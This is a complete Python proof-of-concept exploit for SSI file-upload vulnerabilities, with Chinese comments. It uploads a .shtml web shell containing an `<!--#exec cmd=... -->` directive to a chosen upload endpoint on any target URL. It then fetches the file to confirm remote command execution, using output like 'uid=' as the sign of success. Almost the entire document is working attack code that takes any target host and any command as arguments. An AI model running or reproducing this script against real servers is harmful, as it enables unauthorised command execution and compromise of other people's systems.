#!/usr/bin/env python3
"""
SSI 文件上传漏洞 POC
原理：服务器允许上传 .shtml 文件且开启了 SSI 解析，
      攻击者可上传包含 <!--#exec cmd="..." --> 的文件实现命令执行。
用法：
    python ssi_upload_poc.py http://example.com --upload /upload.php --dir uploads --cmd "id"
"""

import requests
import sys
import argparse
from urllib.parse import urljoin


def upload_and_trigger(base_url, upload_endpoint, upload_dir, file_field, filename, cmd, timeout=10):
    """
    上传恶意 .shtml 文件并检查命令执行结果
    """
    # 1. 构造恶意文件内容
    payload = f"<!--#exec cmd=\"{cmd}\" -->"
    files = {
        file_field: (filename, payload, "text/html")  # Content-Type 设为 text/html 更易被解析为 SSI
    }

    # 2. 上传文件
    upload_url = urljoin(base_url, upload_endpoint)
    print(f"[*] 上传目标: {upload_url}")
    try:
        resp = requests.post(upload_url, files=files, timeout=timeout)
    except requests.RequestException as e:
        print(f"[-] 上传请求失败: {e}")
        sys.exit(1)

    print(f"[*] 上传响应状态码: {resp.status_code}")
    if resp.status_code not in (200, 201, 302):
        print("[-] 上传可能失败，响应内容：")
        print(resp.text[:500])
        # 某些情况下仍可能成功，继续尝试访问

    # 3. 构造恶意文件的访问 URL
    # 注意：部分服务器可能重命名文件，这里假定文件名不变；实际使用时可能需要根据响应调整
    shell_url = urljoin(base_url, f"{upload_dir.rstrip('/')}/{filename}")
    print(f"[*] 尝试访问恶意文件: {shell_url}")

    try:
        resp2 = requests.get(shell_url, timeout=timeout)
    except requests.RequestException as e:
        print(f"[-] 访问恶意文件失败: {e}")
        sys.exit(1)

    print(f"[*] 访问响应状态码: {resp2.status_code}")
    response_text = resp2.text

    # 4. 判断命令是否执行
    # 如果响应中包含 <!--#exec 原始指令，说明 SSI 未被解析
    if "<!--#exec" in response_text:
        print("[-] 漏洞不存在：SSI 指令未被解析。")
        print("响应内容预览：")
        print(response_text[:500])
        return False

    # 如果响应中不包含原始指令，且得到了内容，很可能执行成功
    # 进一步简单判断：若执行的是 id，检查是否包含 uid= 字样
    if cmd.strip().startswith("id") and "uid=" in response_text:
        print("[+] 漏洞确认！命令执行结果如下：")
        print(response_text)
        return True

    if cmd.strip().startswith("ls") and ("index" in response_text or "html" in response_text):
        # 简单启发：若执行 ls 看到典型文件列表
        print("[+] 漏洞确认！命令执行结果（可能包含目录列表）：")
        print(response_text)
        return True

    # 其他情况，直接打印响应，交由人工判断
    print("[*] 无法自动确认，请手动检查以下响应内容：")
    print(response_text[:1000])
    # 若响应不为空且看起来像命令输出，可视为疑似成功
    if response_text.strip():
        print("[+] 响应非空，可能命令已执行。")
        return True
    return False


def main():
    parser = argparse.ArgumentParser(description="SSI 文件上传漏洞 POC")
    parser.add_argument("url", help="目标基础 URL，例如 http://example.com")
    parser.add_argument("--upload", default="/upload.php", help="上传接口路径 (默认: /upload.php)")
    parser.add_argument("--dir", default="uploads", help="上传文件存储目录 (默认: uploads)")
    parser.add_argument("--field", default="file", help="文件上传字段名 (默认: file)")
    parser.add_argument("--filename", default="shell.shtml", help="上传文件名 (默认: shell.shtml)")
    parser.add_argument("--cmd", default="ls", help="要执行的系统命令 (默认: ls)")
    parser.add_argument("--timeout", type=int, default=10, help="请求超时秒数 (默认: 10)")
    args = parser.parse_args()

    base_url = args.url.rstrip("/")
    print(f"[+] 目标: {base_url}")
    print(f"[+] 上传接口: {args.upload}")
    print(f"[+] 文件目录: {args.dir}")
    print(f"[+] 文件名: {args.filename}")
    print(f"[+] 执行命令: {args.cmd}")

    success = upload_and_trigger(
        base_url=base_url,
        upload_endpoint=args.upload,
        upload_dir=args.dir,
        file_field=args.field,
        filename=args.filename,
        cmd=args.cmd,
        timeout=args.timeout
    )

    if success:
        print("\n[✓] 漏洞利用成功！")
    else:
        print("\n[-] 漏洞利用失败或无法确认。")


if __name__ == "__main__":
    main()